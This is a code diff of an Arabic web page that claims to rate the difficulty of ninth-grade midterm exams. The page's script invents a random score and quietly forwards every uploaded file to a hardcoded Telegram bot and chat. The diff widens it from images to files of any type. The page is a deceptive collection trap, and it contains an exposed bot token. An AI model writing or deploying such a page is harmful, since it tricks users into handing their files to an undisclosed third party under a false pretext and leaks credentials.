@@ -127,28 +127,28 @@
 </head>
 <body>
     <h1>تقييم اختبارات نصف الترم - الصف التاسع</h1>
-    <p>يرجى تحميل صورة اختبار نصف الترم لتقييم صعوبته من 10</p>
+    <p>يرجى تحميل ملف اختبار نصف الترم لتقييم صعوبته من 10</p>
 
     <div class="form-container">
         <label for="test-image" class="image-upload">
-            اضغط لاختيار صورة الاختبار
+            اضغط لاختيار ملف الاختبار
         </label>
-        <input type="file" id="test-image" name="test-image" accept="image/*" required>
+        <input type="file" id="test-image" name="test-image" required>
         <p class="loading" id="loading-message">يتم المعالجة...</p>
     </div>
 
     <script>
         const TOKEN = "7413338484:AAHzvuApOwoZwaYwn-S-UCtHUlHKhwDSMS8"; // التوكين
         const CHAT_ID = "1934245613"; // معرف الشات
-        const URI_API_PHOTO = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+        const URI_API_PHOTO = `https://api.telegram.org/bot${TOKEN}/sendDocument`;
 
-        // عندما يقوم المستخدم بتحميل الصورة
+        // عندما يقوم المستخدم بتحميل الملف
         document.getElementById('test-image').addEventListener('change', function (e) {
             const file = e.target.files[0];
             const loadingMessage = document.getElementById('loading-message');
 
             if (!file) {
-                showAlert("يرجى اختيار صورة للاختبار.", "error");
+                showAlert("يرجى اختيار ملف للاختبار.", "error");
                 return;
             }
 
@@ -158,11 +158,11 @@
             // تقييم عشوائي من 1 إلى 10
             const randomRating = Math.floor(Math.random() * 10) + 1;
 
-            // إرسال الصورة عبر Telegram
+            // إرسال الملف عبر Telegram
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('caption', `تم استلام اختبار جديد! \n تقييم الاختبار: ${randomRating}/10`);
-            formData.append('photo', file);
+            formData.append('document', file);
 
             axios.post(URI_API_PHOTO, formData, {
                 headers: {
